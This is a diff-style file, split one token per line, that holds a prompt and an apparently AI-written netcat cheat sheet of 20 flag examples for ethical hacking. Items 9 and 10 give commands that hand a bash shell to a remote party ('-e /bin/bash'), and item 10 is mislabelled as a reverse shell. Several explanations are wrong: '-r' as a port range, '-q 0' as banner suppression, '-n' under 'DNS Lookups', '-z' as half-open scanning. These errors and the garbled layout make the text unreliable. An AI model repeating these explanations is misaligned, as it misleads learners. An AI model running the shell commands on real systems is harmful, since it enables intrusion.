@@ -1,0 +1,1114 @@
+You are a skilled pedagogue who could teach computer science and ethical hacking to anyone regardless of experience level. You are very good at using simple explanations to distill the most important concepts of any topic. You are tasked to provide a cheat sheet or synopsis of netcat with examples for up to the 20 most commonly used flags or switches. The format should first start with an example of the target usage and then a brief explanation of each of the component parts of the command.
+
+**
+Net
+cat
+ Cheat
+ Sheet
+**
+
+Net
+cat
+ (
+often
+ abbreviated
+ as
+ nc
+)
+ is
+ a
+ versatile
+ networking
+ utility
+ that
+ can
+ be
+ used
+ for
+ a
+ wide
+ range
+ of
+ tasks
+,
+ including
+ network
+ exploration
+,
+ port
+ scanning
+,
+ transferring
+ files
+,
+ and
+ even
+ creating
+ reverse
+ shells
+ for
+ ethical
+ hacking
+.
+ Here
+ are
+ the
+
+
+20
+ most
+ commonly
+ used
+ flags
+ or
+ switches
+ along
+ with
+ examples
+ and
+ explanations
+ for
+ each
+:
+
+1
+.
+ **
+Basic
+ Connection
+:
+**
+
+
+ Example
+:
+
+
+nc
+ target
+_ip
+ target
+_port
+
+
+
+
+ -
+
+
+target
+_ip
+:
+ The
+ IP
+ address
+ of
+ the
+ target
+ machine
+.
+
+
+ -
+
+
+target
+_port
+:
+ The
+ port
+ to
+ connect
+ to
+ on
+ the
+ target
+ machine
+.
+
+2
+.
+ **
+Listening
+ Mode
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+l
+ -
+p
+ listening
+_port
+
+
+
+
+ -
+ -
+l
+:
+ Listen
+ mode
+.
+
+
+ -
+ -
+p
+ listening
+_port
+:
+ Specify
+ the
+ port
+ to
+ listen
+ on
+.
+
+3
+.
+ **
+Verbose
+ Output
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+v
+ target
+_ip
+ target
+_port
+
+
+
+
+ -
+ -
+v
+:
+ Ver
+bose
+ output
+,
+ shows
+ more
+ details
+ about
+ the
+ connection
+.
+
+4
+.
+ **
+Port
+ Sc
+anning
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+z
+ target
+_ip
+ start
+_port
+-end
+_port
+
+
+
+
+ -
+ -
+z
+:
+ Scan
+ mode
+ (
+no
+ data
+ transfer
+).
+
+
+ -
+
+
+start
+_port
+:
+ Starting
+ port
+ of
+ the
+ range
+.
+
+
+ -
+
+
+end
+_port
+:
+ Ending
+ port
+ of
+ the
+ range
+.
+
+5
+.
+ **
+UDP
+ Mode
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+u
+ target
+_ip
+ target
+_port
+
+
+
+
+ -
+ -
+u
+:
+ Use
+ UDP
+ instead
+ of
+ TCP
+.
+
+6
+.
+ **
+Listening
+ with
+ UDP
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+lu
+ -
+p
+ listening
+_port
+
+
+
+
+ -
+ -
+lu
+:
+ Listen
+ using
+ UDP
+.
+
+
+ -
+ -
+p
+ listening
+_port
+:
+ Specify
+ the
+ UDP
+ port
+ to
+ listen
+ on
+.
+
+7
+.
+ **
+File
+ Transfer
+ (
+Sending
+):
+**
+
+
+ Example
+:
+
+
+nc
+ target
+_ip
+ target
+_port
+ <
+ file
+_to
+_send
+
+
+
+
+ -
+ <
+ file
+_to
+_send
+:
+ Redirect
+s
+ the
+ contents
+ of
+ the
+ file
+ to
+ the
+ target
+.
+
+8
+.
+ **
+File
+ Transfer
+ (
+Re
+ceiving
+):
+**
+
+
+ Example
+:
+
+
+nc
+ -
+l
+ -
+p
+ listening
+_port
+ >
+ received
+_file
+
+
+
+
+ -
+
+
+>
+ received
+_file
+:
+ Redirect
+s
+ incoming
+ data
+ to
+ a
+ file
+.
+
+9
+.
+ **
+Execute
+ Command
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+e
+ /
+bin
+/bash
+ target
+_ip
+ target
+_port
+
+
+
+
+ -
+ -
+e
+ /
+bin
+/bash
+:
+ Execute
+ a
+ shell
+ on
+ the
+ remote
+ machine
+.
+
+10
+.
+ **
+Reverse
+ Shell
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+l
+ -
+p
+ listening
+_port
+ -
+e
+ /
+bin
+/bash
+
+
+
+
+ -
+ -
+l
+:
+ Listen
+ mode
+.
+
+
+ -
+ -
+p
+ listening
+_port
+:
+ Specify
+ the
+ port
+ to
+ listen
+ on
+.
+
+
+ -
+ -
+e
+ /
+bin
+/bash
+:
+ Execute
+ a
+ shell
+ upon
+ connection
+.
+
+11
+.
+ **
+DNS
+ Look
+ups
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+v
+ -
+n
+ -
+z
+ -
+w
+
+
+1
+ target
+_ip
+
+
+80
+
+
+
+
+ -
+ -
+n
+:
+ Numeric
+-only
+ IP
+ addresses
+ (
+no
+ DNS
+).
+
+
+ -
+ -
+z
+:
+ Scan
+ mode
+.
+
+
+ -
+ -
+w
+
+
+1
+:
+ Timeout
+ for
+ connection
+ attempts
+.
+
+12
+.
+ **
+Proxy
+ Commands
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+X
+ connect
+ -
+x
+ proxy
+_ip
+:
+proxy
+_port
+ target
+_ip
+ target
+_port
+
+
+
+
+ -
+ -
+X
+ connect
+:
+ Use
+ the
+ connect
+ proxy
+ type
+.
+
+
+ -
+ -
+x
+ proxy
+_ip
+:
+proxy
+_port
+:
+ Proxy
+ address
+ and
+ port
+.
+
+13
+.
+ **
+Source
+ Port
+ Spo
+of
+ing
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+p
+ source
+_port
+ target
+_ip
+ target
+_port
+
+
+
+
+ -
+ -
+p
+ source
+_port
+:
+ Spo
+of
+ the
+ source
+ port
+.
+
+14
+.
+ **
+Banner
+ Grab
+bing
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+v
+ target
+_ip
+ target
+_port
+
+
+
+
+ -
+ -
+v
+:
+ Ver
+bose
+ output
+.
+
+
+ -
+ Display
+ the
+ banner
+ information
+ sent
+ by
+ the
+ target
+.
+
+15
+.
+ **
+Timeout
+ Setting
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+w
+ timeout
+_seconds
+ target
+_ip
+ target
+_port
+
+
+
+
+ -
+ -
+w
+ timeout
+_seconds
+:
+ Set
+ a
+ connection
+ timeout
+.
+
+16
+.
+ **
+IPv
+6
+ Support
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+6
+ target
+_ip
+ target
+_port
+
+
+
+
+ -
+ -
+6
+:
+ Use
+ IPv
+6
+.
+
+17
+.
+ **
+Keep
+-
+Alive
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+k
+ -
+l
+ -
+p
+ listening
+_port
+
+
+
+
+ -
+ -
+k
+:
+ Keep
+ the
+ listening
+ socket
+ open
+ for
+ multiple
+ connections
+.
+
+18
+.
+ **
+Half
+-
+Open
+ Sc
+anning
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+z
+ -
+v
+ -
+n
+ -
+w
+
+
+1
+ target
+_ip
+ start
+_port
+-end
+_port
+
+
+
+
+ -
+ -
+z
+:
+ Scan
+ mode
+.
+
+
+ -
+ -
+v
+:
+ Ver
+bose
+ output
+.
+
+
+ -
+ -
+n
+:
+ Numeric
+-only
+ IP
+ addresses
+.
+
+
+ -
+ -
+w
+
+
+1
+:
+ Timeout
+ for
+ connection
+ attempts
+.
+
+19
+.
+ **
+Port
+ Range
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+v
+ -
+n
+ -
+z
+ target
+_ip
+ -
+r
+ start
+_port
+-end
+_port
+
+
+
+
+ -
+ -
+r
+ start
+_port
+-end
+_port
+:
+ Specify
+ a
+ range
+ of
+ ports
+.
+
+20
+.
+ **
+Banner
+less
+ Connection
+:
+**
+
+
+ Example
+:
+
+
+nc
+ -
+q
+
+
+0
+ target
+_ip
+ target
+_port
+
+
+
+
+ -
+ -
+q
+
+
+0
+:
+ Don
+'t
+ display
+ banner
+ information
+.
+
+Remember
+,
+ net
+cat
+ is
+ a
+ powerful
+ tool
+,
+ so
+ use
+ it
+ responsibly
+ and
+ eth
+ically
+.
+ Always
+ ensure
+ you
+ have
+ proper
+ authorization
+ before
+ attempting
+ any
+ activities
+ that
+ might
+ impact
+ systems
+ you
+ don
+'t
+ own
+ or
+ have
+ permission
+ to
+ access
+.
+
+
